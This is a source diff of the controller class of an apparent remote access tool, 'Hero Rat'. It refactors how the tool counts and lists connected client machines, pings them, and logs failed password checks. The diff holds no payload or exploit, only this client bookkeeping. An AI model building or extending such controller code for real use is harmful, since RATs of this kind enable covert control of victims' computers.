@@ -5,7 +5,6 @@ import java.awt.event.ActionListener;
 import java.io.DataOutputStream;
 import java.io.OutputStream;
 import java.net.ServerSocket;
-import java.net.Socket;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Iterator;
@@ -29,6 +28,7 @@ import java.awt.TrayIcon.MessageType;
 
 public class Network extends Thread
 {
+	private static int refresh_time = 1000;
 	private int port;
 	private String password;
 	
@@ -39,28 +39,30 @@ public class Network extends Thread
 	private ServerSocket serverSocket;
 	private long start_time;
 	
-	private Timer timer_refresh = new Timer(1000, new ActionListener() {
+	private Timer timer_refresh = new Timer(refresh_time, new ActionListener() {
 		public void actionPerformed(ActionEvent e)
 		{
 			Main.mainWindow.setTitle("Hero Rat - Remote Administration Tool - Online servers " + servers.size());
 			
-			Main.mainWindow.panel_tab1.label_online.setText("Online servers: " + servers.size());
-			Main.mainWindow.panel_tab1.label_offline.setText("Offline servers: " + (DBServers.getCount() - servers.size()));
-			Main.mainWindow.panel_tab1.label_total.setText("Total servers: " + DBServers.getCount());
-			
+			Main.mainWindow.serverStatusPanel.setOnlineClients(Integer.toString(servers.size()));
+			Main.mainWindow.serverStatusPanel.setOfflineClients(Integer.toString((DBServers.getCount() - servers.size())));
+			Main.mainWindow.serverStatusPanel.setTotalClients(Integer.toString(DBServers.getCount()));
+
+			Main.mainWindow.ServerStatusTree.addOnlineObjects(servers.values());
+
 			for (Server server : servers.values())
 			{
 				Ping.send(server);
 				
 				int row;
-				for (row=0; row<Main.mainWindow.panel_tab2.model_servers.getRowCount(); row++)
+				for (row=0; row<Main.mainWindow.PanelServers.model_servers.getRowCount(); row++)
 				{
-					if (Main.mainWindow.panel_tab2.model_servers.getValueAt(row, 6).equals(server.getUid())) break;
+					if (Main.mainWindow.PanelServers.model_servers.getValueAt(row, 6).equals(server.getUid())) break;
 				}
 				
-				Main.mainWindow.panel_tab2.model_servers.setValueAt(server.getUptime(), row, 4);
-				Main.mainWindow.panel_tab2.model_servers.setValueAt(server.getPing(), row, 5);
-				Main.mainWindow.panel_tab2.model_servers.setValueAt(server.getComment(), row, 7);
+				Main.mainWindow.PanelServers.model_servers.setValueAt(server.getUptime(), row, 4);
+				Main.mainWindow.PanelServers.model_servers.setValueAt(server.getPing(), row, 5);
+				Main.mainWindow.PanelServers.model_servers.setValueAt(server.getComment(), row, 7);
 			}
 		}
 	});
@@ -138,8 +140,9 @@ public class Network extends Thread
 	{
 		timer_refresh.stop();
 		Main.mainWindow.setTitle("Hero Rat - Remote Administration Tool");
-		Main.mainWindow.panel_tab1.label_online.setText("Online servers: 0");
-		Main.mainWindow.panel_tab1.label_offline.setText("Offline servers: " + DBServers.getCount());
+		Main.mainWindow.serverStatusPanel.setOnlineClients("0");
+		Main.mainWindow.serverStatusPanel.setOfflineClients(Integer.toString(DBServers.getCount()));;
+		Main.mainWindow.serverStatusPanel.setTotalClients(Integer.toString(DBServers.getCount()));
 		
 		this.isConnected = false;
 		try
@@ -169,7 +172,6 @@ public class Network extends Thread
 				OutputStream output = server.socket.getOutputStream();
 				DataOutputStream outputstream = new DataOutputStream(output);
 
-				
 				if(server.isAuth(this.password))
 				{
 					servers.put(server.getUid(), server);
@@ -197,21 +199,22 @@ public class Network extends Thread
 					
 					server.start();
 					
-					Main.mainWindow.panel_tab2.model_servers.addRow( server.getRowData() );
-					Main.mainWindow.panel_tab3.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab4.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab5.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab6.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab7.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab8.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab9.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab10.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab11.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
-					Main.mainWindow.panel_tab12.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+					Main.mainWindow.PanelServers.model_servers.addRow( server.getRowData() );
+//					Main.mainWindow.panel_tab3.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab4.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab5.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab6.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab7.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab8.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab9.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab10.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab11.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
+//					Main.mainWindow.panel_tab12.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
 					
 				}
 				else
 				{
+					Logger.log("Inccorrect password\n");
 					server.disconnect();
 				}
 			}
